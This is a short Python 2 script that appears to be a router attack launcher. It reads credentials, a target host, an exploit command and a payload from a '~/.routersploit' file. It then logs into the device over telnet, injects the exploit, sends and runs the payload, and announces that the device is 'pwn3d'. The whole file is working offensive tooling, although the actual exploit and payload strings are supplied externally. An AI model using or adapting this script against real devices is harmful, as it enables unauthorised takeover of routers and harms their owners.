#!/usr/bin/python
# coding=UTF8

import os
import sys
import telnetlib

config = os.path.expanduser("~/.routersploit")

f = open(config)
username = f.readline().strip()
password = f.readline().strip()
host = f.readline().strip()
sploit = f.readline().strip()
payload = f.readline().strip()

try:
  c = telnetlib.Telnet(host)
  print "Logging into target…"
  c.read_until("Login: ")
  c.write(username + "\n")
  c.read_until("Password: ")
  c.write(password + "\n")
  c.read_until(" > ")
  print "Successfully logged into target, sending exploit."
  c.write(sploit + "\n")
  c.read_until("# ")
  print "Exploit successful! Sending payload."
  c.write(payload + "\n")
  print "Payload sent."
  c.read_until("# ")
  print "Payload executed successfully! Device is now 'pwn3d'. Have a nice day!"

except (IOError, EOFError):
    print "Something went wrong, sorry."
